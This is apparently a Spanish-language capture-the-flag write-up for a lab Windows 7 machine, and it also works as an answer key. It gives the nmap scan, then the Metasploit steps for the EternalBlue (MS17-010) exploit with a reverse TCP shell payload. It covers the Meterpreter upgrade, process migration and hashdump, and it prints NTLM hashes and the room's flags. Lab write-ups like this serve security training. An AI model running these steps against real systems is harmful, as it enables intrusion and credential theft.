PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server

-Enumeración más a fondo:
	nmap -p135,139,445,3389 -sCV 10.10.45.89
	445/tcp  open  microsoft-ds Windows 7 Professional 7601 Service Pack 1

-Buscamos exploits para la versión de Windows en google y vemos que es vulnerable a EternalBlue

-Código de la vulnerabilidad: MS17-010

-Iniciamos la consola de Metasploit y buscamos la vuln:
	msfconsole
	search MS17-010

-Elegimos la primera opción y le pasamos los parámetros requeridos:
	use 0 -> show options
	set rhosts
	set lhost 

-Vamos a generar un Payload que nos devuelva una shell, en vez de un Meterpreter (Esto lo hacemos para practicar, ya que más adelante tendremos que migrar la shell a un Meterpreter):
		set payload windows/x64/shell/reverse_tcp

-Ejecutamos el exploit y nos devuelve una shell
	run

-Para pasar de shell a meterpreter hacemos lo siguiente:
	1-Control + Z
	2-search shell_to_meterpreter
	3-use 0
	4-Vemos las sesiones que tenemos abiertas (debe de estar la sesión en la que hemos hecho control + Z). Copiamos el ID de la sesión:
		sessions -l
	5-Observamos los parámetros que nos pide:
		Show options
	6-Aportamos los parámetros necesarios:
		set session 1
	7-Ejecutamos el exploit
		run

-Después de esto, se abrirá otra sesión, esta vez con Meterpreter

-Para entrar en la sesión tenemos que ejecutarla:
	sessions -i 1

Después de esto, tendremos nuestra shell de meterpreter

-Al entrar a la máquina ya somos root (en windows se llama NT/Autority/System). 

-Nos piden que migremos de proceso actual (Powershell) a otro proceso para que la shell sea más estable:
	-Listamos los procesos:
		meterpreter > ps
	-Migramos al proceso winLogon.exe. Hay que poner el PYD:
		migrate 644

-Lo siguiente que nos piden es que utilicemos la herramienta hashdump para listar los usuarios del sistema y sus contraseñas:
meterpreter > hashdump	Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::

-Desciframos la contraseña de Jon:
	-Esta es la contraseña completa:
		aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d
	-Este es el hash de la contraseña:
		ffb43f0de35be4d9917ac0cc8ad57f8d

# Flags

-La primera flag está en /
	flag{access_the_machine}
-La segunda flag está en la ruta donde se guardan las contraseñas:
	Windows\system32\config
		flag{sam_database_elevated_access}
-La tercera está en la siguiente ruta:
	C:\Users\Jon\Documents
		flag{admin_documents_can_be_valuable}


